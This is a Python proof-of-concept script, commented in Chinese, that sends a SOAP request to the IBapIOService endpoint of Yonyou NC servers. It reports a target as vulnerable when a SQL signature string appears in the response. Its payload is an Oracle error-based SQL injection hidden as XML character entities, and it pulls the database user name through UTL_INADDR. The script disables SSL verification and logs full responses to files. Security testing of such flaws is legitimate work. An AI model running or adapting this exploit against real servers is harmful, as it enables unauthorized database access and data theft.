import requests
import urllib3
import sys
import time
from urllib.parse import urljoin, urlparse

# 禁用SSL警告和验证
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 漏洞检测的POC数据
POC_DATA = """<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">
    <soapenv:Header/>
    <soapenv:Body>
        <gs:getBapTableDatas>
            <gs:stringarrayItem>&#x44;&#x57;&#x51;&#x75;&#x65;&#x75;&#x65;&#x40;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x51;&#x75;&#x65;&#x75;&#x65;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x31;&#x3d;&#x55;&#x54;&#x4c;&#x5f;&#x49;&#x4e;&#x41;&#x44;&#x44;&#x52;&#x2e;&#x47;&#x45;&#x54;&#x5f;&#x48;&#x4f;&#x53;&#x54;&#x5f;&#x41;&#x44;&#x44;&#x52;&#x45;&#x53;&#x53;&#x28;&#x27;&#x7e;&#x27;&#x7c;&#x7c;&#x28;&#x75;&#x73;&#x65;&#x72;&#x29;&#x7c;&#x7c;&#x27;&#x7e;&#x27;&#x29;&#x2d;&#x2d;&#x20;&#x61;&#x62;&#x63;
</gs:stringarrayItem>
        </gs:getBapTableDatas>
    </soapenv:Body>
</soapenv:Envelope>"""

# 漏洞特征字符串
VULN_STRING = "SELECT guid,dsname,tableid,displayname,displayname2,displayname3,displayname4,displayname5,displayname6,moduleid,authtype,help,creationtime,modifiedtime,creator,modifier,pk_org,pk_group,dirguid,dr,ts,assetLayer,assetIndustry FROM bi_md_table WHERE"

# 请求头
HEADERS = {
    'Content-Type': 'text/xml',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
}

def check_vulnerability(url):
    """
    检查单个URL是否存在漏洞
    """
    try:
        # 确保URL格式正确，拼接路径
        parsed_url = urlparse(url)
        if not parsed_url.scheme:
            url = "http://" + url
        
        # 确保有完整的路径
        target_url = urljoin(url.rstrip('/') + '/', 'uapws/service/nc.itf.bap.service.IBapIOService')
        
        print(f"[INFO] 正在检测: {url}")
        print(f"[INFO] 目标地址: {target_url}")
        
        # 发送POST请求，禁用SSL验证
        response = requests.post(
            target_url,
            data=POC_DATA,
            headers=HEADERS,
            verify=False,
            timeout=10,
            allow_redirects=False  # 不跟随重定向
        )
        
        # 检查状态码
        status_code = response.status_code
        
        # 获取响应信息
        response_text = response.text
        response_headers = dict(response.headers)
        
        # 记录完整响应到 all.txt
        with open('all.txt', 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*80}\n")
            f.write(f"检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"目标URL: {url}\n")
            f.write(f"请求地址: {target_url}\n")
            f.write(f"状态码: {status_code}\n")
            f.write(f"响应头:\n")
            for key, value in response_headers.items():
                f.write(f"  {key}: {value}\n")
            f.write(f"响应内容:\n{response_text}\n")
            f.write(f"{'='*80}\n\n")
        
        print(f"[INFO] 已将完整响应记录到 all.txt")
        
        # 如果状态码是3xx，认为不存在漏洞
        if 300 <= status_code < 400:
            print(f"[INFO] {url} - 状态码 {status_code}，不存在漏洞（3xx重定向）")
            return False, None
        
        # 检查响应中是否包含漏洞特征字符串
        if VULN_STRING in response_text:
            print(f"[VULNERABLE] {url} - 发现漏洞！")
            return True, {
                'url': url,
                'target_url': target_url,
                'status_code': status_code,
                'response_length': len(response_text),
                'response_headers': response_headers,
                'vulnerable': True
            }
        else:
            print(f"[SAFE] {url} - 状态码 {status_code}，响应中未发现漏洞特征")
            return False, None
            
    except requests.exceptions.SSLError as e:
        error_msg = f"SSL错误: {str(e)}"
        print(f"[ERROR] {url} - {error_msg}")
        # 记录错误到 all.txt
        with open('all.txt', 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*80}\n")
            f.write(f"检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"目标URL: {url}\n")
            f.write(f"错误: {error_msg}\n")
            f.write(f"{'='*80}\n\n")
        return False, None
    except requests.exceptions.ConnectionError as e:
        error_msg = f"连接错误: {str(e)}"
        print(f"[ERROR] {url} - {error_msg}")
        with open('all.txt', 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*80}\n")
            f.write(f"检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"目标URL: {url}\n")
            f.write(f"错误: {error_msg}\n")
            f.write(f"{'='*80}\n\n")
        return False, None
    except requests.exceptions.Timeout as e:
        error_msg = "请求超时"
        print(f"[ERROR] {url} - {error_msg}")
        with open('all.txt', 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*80}\n")
            f.write(f"检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"目标URL: {url}\n")
            f.write(f"错误: {error_msg}\n")
            f.write(f"{'='*80}\n\n")
        return False, None
    except Exception as e:
        error_msg = f"发生错误: {str(e)}"
        print(f"[ERROR] {url} - {error_msg}")
        with open('all.txt', 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*80}\n")
            f.write(f"检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"目标URL: {url}\n")
            f.write(f"错误: {error_msg}\n")
            f.write(f"{'='*80}\n\n")
        return False, None

def main():
    # 检查命令行参数
    if len(sys.argv) < 2:
        print("使用方法: python script.py <url>")
        print("示例: python script.py http://example.com")
        print("       python script.py https://192.168.1.100:8080")
        return
    
    url = sys.argv[1].strip()
    
    if not url:
        print("[ERROR] 请输入有效的URL")
        return
    
    print(f"[INFO] 开始检测漏洞，目标: {url}")
    
    # 检测漏洞
    is_vulnerable, vuln_info = check_vulnerability(url)
    
    # 如果发现漏洞，写入result.txt
    if is_vulnerable and vuln_info:
        try:
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f"检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"存在漏洞的URL: {vuln_info['url']}\n")
                f.write(f"目标地址: {vuln_info['target_url']}\n")
                f.write(f"状态码: {vuln_info['status_code']}\n")
                f.write(f"响应长度: {vuln_info['response_length']}\n")
                f.write(f"漏洞特征: {VULN_STRING[:50]}...\n")
                f.write(f"响应头:\n")
                for key, value in vuln_info['response_headers'].items():
                    f.write(f"  {key}: {value}\n")
                f.write("-" * 50 + "\n\n")
            print(f"[SUCCESS] 已将漏洞信息写入 result.txt")
        except Exception as e:
            print(f"[ERROR] 写入文件失败: {str(e)}")
    
    print(f"[INFO] 检测完成")

if __name__ == "__main__":
    main()